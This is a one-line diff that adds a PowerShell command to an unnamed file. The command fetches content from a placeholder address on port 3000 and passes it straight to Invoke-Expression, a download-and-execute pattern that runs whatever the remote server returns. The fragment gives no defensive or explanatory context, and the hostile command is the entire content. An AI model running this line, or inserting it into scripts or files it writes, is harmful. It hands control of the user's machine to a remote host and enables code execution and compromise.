@@ -1,0 +1,1 @@
+Invoke-Expression (Invoke-RestMethod -Uri "http://PLACEHOLDER_IP:3000/api")
